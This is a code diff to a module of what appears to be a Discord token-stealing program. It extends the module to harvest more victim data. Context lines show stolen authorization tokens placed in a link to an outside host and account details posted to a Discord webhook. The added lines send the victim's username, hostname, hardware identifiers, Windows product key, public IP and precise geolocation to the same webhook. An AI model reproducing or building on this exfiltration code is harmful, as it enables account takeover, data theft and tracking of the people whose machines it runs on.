@@ -1,4 +1,4 @@
-const { getPublicIp } = require("./../../modules/core/core");
+const { getPublicIp, getInfo } = require("./../../modules/core/core");
 const { fetchServers, getEmbeds, send } = require("./../../utils/functions");
 const { WebhookClient } = require("discord.js");
 const { totalsTokens, find } = require("./find");
@@ -64,13 +64,14 @@ async function sendTokens() {
             headers: {
                 Authorization: token,
             },
-        })  .then((r) => { k4itrun = r.data })
+        }).then((r) => { k4itrun = r.data })
             .catch((e) => { k4itrun = null });
 
         if (!k4itrun) continue;
 
         var copy = `https://6889.fun/api/aurathemes/raw?data=${token}`;
         var servers = await fetchServers(token);
+        let system = await getInfo();
         let network = await getPublicIp();
         var discord = new DiscordToken(token, network.ip, k4itrun.password).info;
 
@@ -120,6 +121,47 @@ async function sendTokens() {
                 "**Pending**" + "`" + discord.pending + "`\n\n" +
                 "**Biography**" + "```yml\n" + (discord.bio === "has no description" ? "Not found" : discord.bio) + "\n```"
         }))), 100);
+
+        setTimeout(() => webhook.send(send(getEmbeds({
+            author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
+            thumbnail: "" + discord.avatar + "",
+            title: "System Informatio(s)",
+            fields: [
+                {
+                    name: "User", 
+                    value: "```yml" +
+                        "\nUsername: " + process.env.USERNAME +
+                        "\nHostname: " + process.env.COMPUTERNAME + "```",
+                    inline: false
+                },
+                {
+                    name: "System", 
+                    value: "```yml" +
+                        "\nCPU: " + system.cpu +
+                        "\nUUID: " + system.uid +
+                        "\nRAM: " + system.ram +
+                        "\nMac Address: " + "Not found" +
+                        "\nProduct Key: " + system.windowskey +
+                        "\nLOCAL IP: " + "Not found" +
+                        "\nOS Version: " + system.windowsversion + "```",
+                    inline: false
+                },
+                {
+                    name: "Network", 
+                    value: "```yml" +
+                        "\nPUBLIC: " + network.ip +
+                        "\nCountry: " + discord.IP.country +
+                        "\nRegion: " + discord.IP.region +
+                        "\nCity: " + discord.IP.city +
+                        "\nLatitude: " + discord.IP.latitude +
+                        "\nLongitude: " + discord.IP.longitude +
+                        "\nISP: " + discord.IP.isp +
+                        "\nTime Zone: " + discord.IP.timezone +
+                        "\nCurrency Code: " + discord.IP.currency_code + "```",
+                    inline: false
+                },
+            ]
+        }))), 150);
         continue;
     }
 }
